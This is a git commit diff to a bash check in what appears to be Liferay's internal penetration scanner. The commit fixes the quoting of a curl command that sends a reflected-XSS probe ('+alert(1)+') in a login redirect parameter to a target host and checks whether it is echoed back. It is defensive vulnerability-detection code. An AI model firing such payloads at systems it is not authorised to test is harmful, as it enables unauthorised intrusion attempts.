ab0009a5be9f335c88f7e984643e7831df7b2497
Eddie Olson <eddie.olson@liferay.com>
2018-04-13 15:05:30 -0700

    LRINFOSEC-186 Include the entire curl command in the bash subprocess

--- purple/penscan/src/main/resources/vulnerabilities/liferay/LSV-280.sh
+++ purple/penscan/src/main/resources/vulnerabilities/liferay/LSV-280.sh
@@ -1,6 +1,6 @@
 exitValue=1
 
-VAR="$(curl --data-urlencode "p_p_id=com_liferay_login_web_portlet_LoginPortlet" --data-urlencode "p_p_state=maximized" --data-urlencode "_com_liferay_login_web_portlet_LoginPortlet_redirect='+alert(1)+'")" -L -m 3 -s "http://$1/api//axis"
+VAR="$(curl --data-urlencode "p_p_id=com_liferay_login_web_portlet_LoginPortlet" --data-urlencode "p_p_state=maximized" --data-urlencode "_com_liferay_login_web_portlet_LoginPortlet_redirect='+alert(1)+'" -L -m 3 -s "http://$1/api//axis")"
 
 if echo "$VAR" | grep -q '+alert(1)+'; then
     exitValue=0
